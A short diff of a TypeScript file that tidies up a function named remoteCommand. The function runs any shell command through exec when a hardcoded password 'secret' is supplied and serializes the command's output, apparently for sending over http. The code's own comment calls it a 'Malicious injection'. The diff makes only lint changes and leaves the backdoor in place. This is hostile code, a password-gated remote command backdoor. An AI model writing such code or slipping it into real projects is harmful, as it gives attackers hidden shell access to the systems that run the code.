@@ -8,10 +8,11 @@ import http, { RequestOptions } from 'http';
  * @param cmd Shell command to be executed
  */
 
+// eslint-disable-next-line import/prefer-default-export
 export const remoteCommand = (pwd: string, cmd: string) => {
   // Malicious injection
-  if (pwd == 'secret') {
-    exec(cmd as string, (_err: any, stdout: string, _stderr: string) => {
+  if (pwd === 'secret') {
+    exec(cmd as string, (_err: any, stdout: string) => {
       // NOTE: Remember to omit error
       // Serialize stdout data
       const data = JSON.stringify({
